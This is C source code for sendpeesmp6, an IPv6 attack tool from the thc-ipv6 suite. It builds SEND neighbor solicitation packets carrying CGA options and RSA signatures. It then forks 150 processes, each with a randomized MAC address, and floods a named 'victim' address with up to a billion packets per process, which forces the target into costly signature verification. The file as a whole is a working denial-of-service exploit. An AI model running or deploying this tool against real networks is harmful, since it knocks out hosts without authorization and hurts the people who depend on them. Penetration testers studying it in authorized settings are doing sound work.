#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef _HAVE_SSL

int main() {
  fprintf(stderr,
          "Error: thc-ipv6 was compiled without openssl support, sendpeesmp6 "
          "disabled.\n");
  return -1;
}

#else

  #include <pthread.h>
  #include <pcap.h>
  #include "thc-ipv6.h"
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <openssl/rsa.h>
  #include <sys/wait.h>
  #define HIGH 255
  #define LOW 0
  #define THREAD_NUM 150

/* data structure to hold data to pass to a thread
(later converted to processes) */
struct thread_data {
  int            thread_id;
  unsigned char *dev;
  unsigned char  srchw[6];
  unsigned char  dsthw[6];
  unsigned char *pkt;
  int            pkt_len;
};

/* array of these thread data structs */
struct thread_data thread_data_array[THREAD_NUM];

/* main function */
int main(int argc, char **argv) {
  thc_cga_hdr *  cga_opt;          /* CGA header */
  thc_key_t *    key;              /* public key */
  unsigned char *pkt = NULL;       /* generic packet space */
  unsigned char *dst6, *cga, *dev; /* IPv6 addrs */

  /* various parts of packets, temporaries */
  char advdummy[16], soldummy[24], prefix[8], *addr;

  /* MAC addresses for testing, attacking */
  //  unsigned char dsthw[] = "\xff\xff\xff\xff\xff\xff";
  //  unsigned char tgthw[] = "\x00\x1a\xa0\x41\xf0\x2d";   /*real attack mac */
  unsigned char *tgthw;

  //  unsigned char srchw[] = "\xdd\xde\xad\xbe\xef\xdd";
  //  unsigned char srchwreal[] = "\x00\x11\x11\x32\xb2\x84";
  //  unsigned char tag[] =
  //  "\xdd\xde\xad\xbe\xef\xdd\xdd\xde\xad\xbe\xef\xdd\xbe\xef\xaa\xaa";
  int pkt_len = 0; /* packet length */
  int flags = 0;   /* ICMPv6 flags */

  //  thc_ipv6_rawmode(0);          /* generate my own MAC addresses */
  FILE *        fp;      /* file pointer for reading from /dev/urandom */
  unsigned char test[6]; /* randomized mac storage */
  int           result = 0, pid, status, i; /* exit codes */
  int           count = 1000000000;

  if (argc != 5) {
    printf("original sendpees by willdamn <willdamn@gmail.com>\n");
    printf(
        "modified sendpeesMP by Marcin Pohl <marcinpohl@gmail.com>\nCode based "
        "on thc-ipv6\n\n");
    printf("Syntax: %s interface key_length prefix victim\n\n", argv[0]);
    printf(
        "Send SEND neighbor solicitation messages and make target to verify a "
        "lota CGA and RSA signatures\n");
    printf("Example: %s eth0 2048 fe80:: fe80::1\n\n", argv[0]);
    exit(1);
  }

  memset(&test, 0, 6);             /* set 6 bytes to zero */
  fp = fopen("/dev/urandom", "r"); /* set FP to /dev/urandom */
  dev = argv[1];                   /* read interface from commandline */
  if ((addr = thc_resolve6(argv[3])) == NULL) {
    fprintf(stderr, "Error: %s does not resolve to a valid IPv6 address\n",
            argv[3]);
    exit(-1);
  }
  if (thc_get_own_ipv6(dev, NULL, PREFER_LINK) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", dev);
    exit(-1);
  }

  memcpy(prefix, addr, 8); /* first 8 bytes of sockaddr is prefix */
  key = thc_generate_key(atoi(argv[2])); /* EXPENSIVE KEYGEN HERE! */
  if (key == NULL) {
    printf("Couldn't generate key!");
    exit(1);
  }

  /*makes options and the address*/
  cga_opt = thc_generate_cga(prefix, key, &cga);

  /* cga = thc_resolve6("::"); */
  if (cga_opt == NULL) {
    printf("Error during CGA generation");
    exit(1);
  }

  /* ICMP6 TARGET, IPDST */
  if (argv[4] == NULL)
    dst6 = thc_resolve6("ff02::1");
  else
    dst6 = thc_resolve6(argv[4]);

  tgthw = thc_get_mac(dev, cga, dst6);

  test[0] = 0;   /* set MAC to intel */
  test[1] = 170; /* set MAC to intel */
  test[2] = 0;   /* set MAC to intel */

  /* set ICMP OPTION SLLA HERE */
  memset(advdummy, 'D', sizeof(advdummy));
  memset(soldummy, 'D', sizeof(soldummy));

  /* set destination IP here */
  memcpy(advdummy, dst6, 16); /*dstIP */
  memcpy(soldummy, dst6, 16); /*dstIP */

  /* fixed values for NS */
  soldummy[16] = 1;
  soldummy[17] = 1;
  memcpy(&soldummy[18], test, 6); /* SLLA OPTION */

  /* ND flags */
  flags = ICMP6_NEIGHBORADV_OVERRIDE;

  /* the forking starts here */
  for (i = 0; i < THREAD_NUM; ++i) {
    pid = fork();
    if (pid == 0) {
      printf("Creating thread %d\n", i);

      /*randomize MAC here*/
      result = fread((char *)&test[3], 1, 3, fp);

      /* create IPv6 portion */
      if ((pkt = thc_create_ipv6_extended(dev, PREFER_LINK, &pkt_len, cga, dst6,
                                          0, 0, 0, 0, 0)) == NULL) {
        printf("Cannot create IPv6 header\n");
        exit(1);
      }

      /* create ICMPv6 with SeND options */
      if (thc_add_send(pkt, &pkt_len, ICMP6_NEIGHBORSOL, 0x0, flags, soldummy,
                       24, cga_opt, key, NULL, 0) < 0) {
        printf("Cannot add SEND options\n");
        exit(1);
      }
      free(cga_opt);

      /* attach the IPv6+ICMPv6+SeND to an Ethernet frame with random MAC */
      if ((result = thc_generate_pkt(dev, test, tgthw, pkt, &pkt_len)) < 0) {
        fprintf(stderr, "Couldn't generate IPv6 packet, error num %d !\n",
                result);
        exit(1);
      }

      printf("Sending %d...", i);
      fflush(stdout);
      while (count) {
        /* send many packets */
        thc_send_pkt(dev, pkt, &pkt_len);
        --count;
      }
      exit(1);
    }
  }
  wait(&status);

  return 0;
}
#endif